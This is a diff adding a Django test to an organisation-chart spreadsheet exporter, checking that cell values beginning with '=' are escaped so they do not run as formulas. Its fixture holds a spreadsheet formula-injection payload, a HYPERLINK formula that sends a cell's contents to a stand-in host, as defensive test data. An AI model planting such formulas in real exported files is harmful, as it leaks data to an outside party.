@@ -326,3 +326,25 @@ def test_no_es_un_xlsx_y_solo_quien_asigna_cargos(db):
     respuesta = admin.post(CARGA, {"archivo": falso}, format="multipart")
     assert respuesta.status_code == 400
     assert "no es un .xlsx válido" in respuesta.json()["errores"][0]
+
+
+def test_un_nombre_que_empieza_por_igual_no_baja_como_formula(db):
+    """Auditoría de seguridad, 29/10/2026: un nombre de la base que empiece por
+    «=» se ejecutaría como fórmula al abrir el organigrama exportado."""
+    c = _estructura()
+    with usando_empresa(empresa_actual()):
+        c["analista"].nombre = '=HYPERLINK("http://x.test/?"&A1,"Ver")'
+        c["analista"].save()
+        OcupanteCargo.objects.create(cargo=c["analista"], nombres="=1+1", apellidos="-Mora")
+    _, admin = _cuenta("ines", "institucional.asignar")
+
+    for libro in (_plantilla(admin), _completo(admin)):
+        _, filas = _filas(libro["Comercial"])
+        cargos = [f[3] for f in filas[1:]]
+        assert '\'=HYPERLINK("http://x.test/?"&A1,"Ver")' in cargos
+        assert all(not str(v).startswith("=") for f in filas for v in f if v is not None)
+
+    # El archivo bajado lleno se vuelve a subir tal cual: la comilla no es parte del dato.
+    assert _subir(admin, _completo(admin), confirmar=True).status_code == 200
+    with usando_empresa(empresa_actual()):
+        assert [str(o) for o in OcupanteCargo.objects.all()] == ["=1+1 -Mora"]
